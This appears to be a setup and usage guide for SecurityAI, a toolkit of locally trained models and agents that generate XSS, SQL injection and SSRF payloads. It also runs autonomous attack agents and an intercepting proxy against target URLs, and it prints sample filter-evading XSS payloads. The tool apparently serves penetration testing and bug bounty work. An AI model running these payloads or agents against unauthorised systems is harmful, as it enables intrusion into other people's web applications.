# Getting Started with SecurityAI

## Prerequisites

Before you can use any model, you need two Python virtual environments per project:

| Venv | Python Version | Used For | Has |
|------|---------------|----------|-----|
| `.venv` | 3.14 | Data pipeline, tests, oracle | pydantic, pyyaml, pytest, playwright |
| `.venv-ml` | 3.12 | Model training, inference | torch, transformers, peft, accelerate, trl |

### Setting up a project (first time)

```bash
cd SecurityAI/xss-ai  # or any other project

# 1. Data pipeline venv
python -m venv .venv
source .venv/Scripts/activate
pip install -e ".[dev]"
# For XSS only (needs browser oracle):
pip install playwright
playwright install chromium
deactivate

# 2. ML venv (for training/inference)
py -3.12 -m venv .venv-ml
source .venv-ml/Scripts/activate
pip install -e ".[dev]"

# Install PyTorch with CUDA (for RTX 5070 / Blackwell):
pip install torch==2.11.0+cu128 --index-url https://download.pytorch.org/whl/cu128

# Install ML stack:
pip install transformers peft accelerate trl datasets

# Common transitive dependencies that may be missing:
pip install typing_extensions filelock sympy networkx jinja2 fsspec packaging requests tqdm regex safetensors pyyaml numpy protobuf

# Verify:
python -c "import torch; print(f'CUDA: {torch.cuda.is_available()}')"
python -c "from transformers import AutoModelForCausalLM; print('transformers OK')"
deactivate
```

Repeat for each project you want to use.

## Generating payloads

### Single vulnerability type

Each project has a generate CLI (usually `scripts/06_generate.py`):

```bash
cd SecurityAI/xss-ai
source .venv-ml/Scripts/activate

# Freeform context description
python scripts/06_generate.py "Input reflected into HTML body, < and > stripped" -n 5

# List all available context presets
python scripts/06_generate.py --list-contexts

# Use a specific context ID
python scripts/06_generate.py --context-id html-body-plain -n 3

# Deterministic (greedy) output
python scripts/06_generate.py "description" --greedy

# Adjust sampling temperature
python scripts/06_generate.py "description" -n 10 --temperature 0.9
```

### What you get

Output is one payload per line on stdout:

```
<style>@keyframes x{}</style><bdo style="animation-name:x" onanimationend="alert(1)"></bdo>
<img src=x onerror=alert(1)>
"><svg onload=alert(1)>
```

Progress info goes to stderr (safe to pipe stdout to a file).

### Context descriptions

The model was trained on natural-language context descriptions. Include:

- **Where** input goes: "reflected into HTML body", "into double-quoted attribute", "server fetches URL"
- **What filters** are applied: "angle brackets stripped", "script keyword blocked", "quotes escaped"
- **What happens**: "redirects are followed", "response reflects input"

Examples:
```
"Input is reflected into the HTML body. The server strips < and >. Quotes allowed."
"Server fetches a URL from the 'url' query parameter. Private IPs are blocked."
"Input goes into a SQL string literal in a WHERE clause. Single quotes are escaped."
```

## Using the orchestrator

### Task-based (recommended)

```bash
cd SecurityAI/exploitgym
source .venv/Scripts/activate

# Describe what you want in natural language
python scripts/run.py --task "Find XSS on the login form" --url "http://target/login"

# Multiple vulnerability types
python scripts/run.py --task "Test for SQL injection and SSRF" --url "http://target/api"

# The router identifies the vuln type(s) and runs the right agents
```

### Autonomous loop mode

```bash
# Agents run in rounds, reading each other's findings
python scripts/run.py --loop --max-rounds 3 "Test this endpoint" --url "http://target"

# What happens:
# Round 1: All agents test independently
# Round 2: Each agent sees Round 1 findings, adjusts approach
# Round 3: Cross-vuln chains trigger (XSS finding → SQLi agent tries same point)
```

### Single agent

```bash
# Run only the SSRF agent
python scripts/run.py --agent ssrf "Server fetches URL" --url "http://target/fetch"
```

### View results

```bash
# Show all findings from the message board
python scripts/run.py --report

# Show as JSON (for scripting)
python scripts/run.py --report --json
```

## Using the MITM proxy

```bash
cd SecurityAI/exploitgym
source .venv/Scripts/activate
python scripts/proxy.py --port 8080
```

Then:
1. Configure browser proxy: HTTP/HTTPS → `localhost:8080`
2. Browse to your target
3. The proxy detects injection points in requests
4. Analyzes response reflection
5. Runs relevant agents automatically
6. Findings stream to terminal + SQLite board

**Detects automatically:**
- Query parameters (`?q=...`, `?url=...`, `?redirect=...`)
- POST body fields
- JSON fields
- Injectable headers (User-Agent, Referer, X-Forwarded-For)

## Tips

- Always use `.venv-ml` for anything involving models (torch/transformers)
- Use `.venv` for data pipeline scripts and tests
- The models need ~2-5 seconds to load on first generation — subsequent calls are fast
- If you get OOM errors, close other GPU-using apps (Steam, browsers with hardware acceleration)
- Sampling mode (`default`) gives diverse payloads; `--greedy` gives the most reliable one
- For bug bounty, pipe output: `python scripts/06_generate.py "desc" -n 20 > payloads.txt`
